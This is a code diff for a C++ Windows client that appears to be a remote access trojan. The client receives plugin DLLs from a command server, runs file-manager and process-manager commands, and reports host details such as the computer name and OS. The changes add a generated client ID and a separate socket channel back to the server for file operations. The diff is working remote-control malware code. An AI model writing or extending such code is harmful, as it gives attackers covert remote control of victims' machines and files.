@@ -91,6 +91,9 @@ private:
     SOCKET sock;
     PluginManager pluginMgr;
     bool connected = false;
+    string serverHost;
+    int serverPort = 0;
+    string clientID;
     string pendingPluginId;
     string pendingPluginCommand;
     bool hasPendingPluginCommand = false;
@@ -131,6 +134,11 @@ private:
         }
     }
 
+    void send_data_over_socket(SOCKET targetSock, json data) {
+        string msg = data.dump() + "\r\n";
+        send(targetSock, msg.c_str(), (int)msg.length(), 0);
+    }
+
     void request_plugin(const string& pluginId, const json& commandToRunAfterLoad = json()) {
         pendingPluginId = pluginId;
         hasPendingPluginCommand = !commandToRunAfterLoad.is_null();
@@ -138,6 +146,96 @@ private:
 
         cout << "[*] " << pluginId << " not found, requesting from server..." << endl;
         send_data({{"action", "request_plugin"}, {"id", pluginId}});
+    }
+
+    void start_plugin_channel(const string& pluginId, const json& initialCommand) {
+        thread([this, pluginId, initialCommand]() {
+            struct addrinfo hints = {0}, *res = NULL;
+            hints.ai_family = AF_INET;
+            hints.ai_socktype = SOCK_STREAM;
+
+            string port_str = to_string(serverPort);
+            if (getaddrinfo(serverHost.c_str(), port_str.c_str(), &hints, &res) != 0) return;
+
+            SOCKET chanSock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+            if (chanSock == INVALID_SOCKET) {
+                if (res) freeaddrinfo(res);
+                return;
+            }
+
+            cout << "[*] Opening dedicated channel connection for " << pluginId << "..." << endl;
+            if (connect(chanSock, res->ai_addr, (int)res->ai_addrlen) != 0) {
+                closesocket(chanSock);
+                if (res) freeaddrinfo(res);
+                return;
+            }
+            if (res) freeaddrinfo(res);
+
+            // Send channel registration
+            json regMsg = {
+                {"action", "register_channel"},
+                {"client_id", clientID},
+                {"plugin_id", pluginId}
+            };
+            send_data_over_socket(chanSock, regMsg);
+
+            // Execute initial command on channel socket if plugin is loaded
+            if (pluginMgr.isPluginLoaded(pluginId)) {
+                pluginMgr.executePluginCommand(pluginId, "HandleCommand", chanSock, initialCommand.dump());
+            }
+
+            // Dedicated channel receive loop
+            vector<uint8_t> recv_buffer;
+            uint8_t chunk[8192];
+
+            while (connected) {
+                int bytesRead = recv(chanSock, (char*)chunk, sizeof(chunk), 0);
+                if (bytesRead <= 0) break;
+
+                recv_buffer.insert(recv_buffer.end(), chunk, chunk + bytesRead);
+
+                while (!recv_buffer.empty()) {
+                    if (recv_buffer.size() >= sizeof(PacketHeader)) {
+                        PacketHeader* header = (PacketHeader*)recv_buffer.data();
+                        if (header->signature == 0x524E) {
+                            if (recv_buffer.size() < sizeof(PacketHeader) + header->size) break;
+
+                            uint8_t* payload = recv_buffer.data() + sizeof(PacketHeader);
+                            if (header->type == PACKET_TYPE_JSON) {
+                                string json_str((char*)payload, header->size);
+                                if (pluginMgr.isPluginLoaded(pluginId)) {
+                                    pluginMgr.executePluginCommand(pluginId, "HandleCommand", chanSock, json_str);
+                                }
+                            } else if (header->type == PACKET_TYPE_FILE_UPLOAD) {
+                                if (pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
+                                    vector<uint8_t> payload_vec(payload, payload + header->size);
+                                    pluginMgr.executePluginBinary(FILE_MANAGER_PLUGIN_ID, "HandleBinary", chanSock, payload_vec);
+                                }
+                            }
+                            recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + sizeof(PacketHeader) + header->size);
+                            continue;
+                        }
+                    }
+
+                    string current_buf((char*)recv_buffer.data(), recv_buffer.size());
+                    size_t pos = current_buf.find("\r\n");
+                    if (pos != string::npos) {
+                        string json_line = current_buf.substr(0, pos);
+                        if (pluginMgr.isPluginLoaded(pluginId)) {
+                            pluginMgr.executePluginCommand(pluginId, "HandleCommand", chanSock, json_line);
+                        }
+                        recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + pos + 2);
+                        continue;
+                    }
+
+                    if (recv_buffer.size() > 128 * 1024 * 1024) recv_buffer.clear();
+                    break;
+                }
+            }
+
+            cout << "[*] Dedicated channel for " << pluginId << " closed." << endl;
+            closesocket(chanSock);
+        }).detach();
     }
 
     void execute_process_manager_command(const json& data) {
@@ -201,14 +299,21 @@ private:
     }
 
     void execute_file_manager_command(const json& data) {
-        if (pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
+        if (!pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
+            request_plugin(FILE_MANAGER_PLUGIN_ID, data);
+            return;
+        }
+
+        string action = data.value("action", "");
+        if (action == "getdrives") {
+            // Initiate a new dedicated channel socket for File Manager
+            start_plugin_channel(FILE_MANAGER_PLUGIN_ID, data);
+        } else {
             SOCKET currentSock = sock;
             string dumpedData = data.dump();
             thread([this, currentSock, dumpedData]() {
                 pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", currentSock, dumpedData);
             }).detach();
-        } else {
-            request_plugin(FILE_MANAGER_PLUGIN_ID, data);
         }
     }
 
@@ -374,7 +479,6 @@ private:
                                 pluginMgr.executePluginBinary(FILE_MANAGER_PLUGIN_ID, "HandleBinary", sock, payload_vec);
                             } else {
                                 request_plugin(FILE_MANAGER_PLUGIN_ID);
-                                // Note: In a production app, you'd queue this binary packet to run after the plugin loads.
                             }
                         } else if (header->type == PACKET_TYPE_DLL) {
                             cout << "[+] DLL received from server." << endl;
@@ -416,7 +520,8 @@ private:
                                     }
                                 } else if (pluginId == FILE_MANAGER_PLUGIN_ID) {
                                     if (hasPendingPluginCommand) {
-                                        pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                        json pendingCmd = json::parse(pendingPluginCommand);
+                                        execute_file_manager_command(pendingCmd);
                                     } else {
                                         pluginMgr.executePlugin(FILE_MANAGER_PLUGIN_ID, "RunPlugin", sock);
                                     }
@@ -473,8 +578,23 @@ private:
         DWORD pSize = sizeof(pcname);
         GetComputerNameA(pcname, &pSize);
 
+        if (clientID.empty()) {
+            GUID guid;
+            if (CoCreateGuid(&guid) == S_OK) {
+                char szGuid[64];
+                sprintf(szGuid, "%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
+                        guid.Data1, guid.Data2, guid.Data3,
+                        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
+                        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
+                clientID = szGuid;
+            } else {
+                clientID = to_string(GetCurrentProcessId());
+            }
+        }
+
         json info = {
             {"action",    "initial_info"},
+            {"id",        clientID},
             {"ip",        "127.0.0.1"},
             {"os",        getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName")},
             {"country",   "TR"},
@@ -488,6 +608,8 @@ private:
 
 public:
     void start(const char* host, int port) {
+        serverHost = host;
+        serverPort = port;
         while (true) {
             WSADATA wsa;
             if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
